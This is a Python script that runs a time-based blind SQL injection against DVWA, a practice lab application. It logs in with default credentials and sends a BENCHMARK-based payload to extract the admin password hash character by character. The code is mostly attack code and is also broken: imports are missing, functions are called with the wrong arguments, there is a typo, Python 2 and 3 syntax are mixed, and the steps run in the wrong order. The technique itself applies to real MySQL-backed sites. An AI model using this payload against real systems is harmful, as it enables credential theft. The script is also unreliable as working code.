#!/usr/bin/env python3

import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 3 :
    print ("[-] usage python dvwa-SQLi-blind.py targetIP timing")
    exit()


security_level = "low"
timing = sys.argv[2]
target = sys.argv[1]
url = 'http://' + target + '/DVWA/login.php'


def csrf_token():
    try:
        #make request to the URL
        print ("\n[i] URL: %s/DVWA/login.php" %target)
        r = requests.get(url, allow_redirects= False)
    except:
        #feedback for the user
        print ("\n[!] csrf_token: Failed to connect URL. \n[i] Quiting")
        sys.exit(-1)

    #Extract anti-csrf token
    source = BeautifulSoup(r.text, "html.parser")
    user_token = source("input", {"name": "user_token"})[0]["value"]
    print (user_token)
    print ("[i] user_token: %s" % user_token)

    #Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print ("[i] session_id: %s" % session_id)

    return session_id, user_token

#Login to DVWA
def dvwa_login(session_id, user_token):
    #POST DATA
    data = { "username": "admin", "password": "password", "user_token": user_token, "Login": "Login"}
    cookie = {"PHPSESSID": session_id, "security": security_level}
    headers = { 'content-type': 'application/x-www-form-urlencoded', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
    try:
        print ("[i] URL: %s/DVWA.login.php" % target)
        print ("[i] Data: %s" % data)
        print ("[i] Cookie: %s" % cookie)
        r = requests.post( url, data=data, cookies=cookie, headers=headers, verify=False, allow_redirects=False)
    except:
        print ("login failed, quiting")
        sys.exit(-1)

    if r.headers["Location"] != 'index.php':
        print ("[-] Login Failed")
        exit()
    
    print ("[+] Logged in Successfully")
    return True

# Send to SQLi payload
def SQLi_blind(session_id, i, j, timing):
    sqli_payload = "%' and 1=(select if(conv(mid((select 1,password from users),%s,1),16,10)=%s,benchmark(%s,rand()),11)#" % (j,i,timing)
    SQli_url = 'http://' + target + '/DVWA/vulnerabilities/sqli_blind/'
    #GET Data
    data = { "id": sqli_payload, "Submit": "Submit" }
    encoded_data = urllib.parse.urlencode(data)
    cookie = {"PHPSESSID": session_id, "security": security_level}
    headers = { 'content-type': 'application/x-www-form-urlencoded', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
    
    start = time.time()
    r = requests.get(SQli_url, params=encoded_data, cookies=cookie, headers=headers, verify=False)
    end = time.time()
    duration = int(end-start)
    return duration

counter = 0
starttime=time.time()
sys.stdout.write("[*] Admin hash is : ")
sys.stdout.flush()

for m in range(1,33):
    for n in range(0,16):
        counter= counter+1
        output = SQLi_blind(n,m,timing)
        if output > ((int(timing)/100)-1):
            char = hex(n)[2:]
            sys.stdout.write(char)
            sys.stdout.flsuh()
            break

endtime = time.time()
totaltime = str(endtime-starttime)
print "\n[*] Total of %s queries in %s seconds" % (counter, totaltime)

# Get initial CSRF token
session_id, user_token = csrf_token()

# Login to DVWA
dvwa_login(session_id, user_token)

#Send Evil SQLi payload
SQLi_blind(session_id)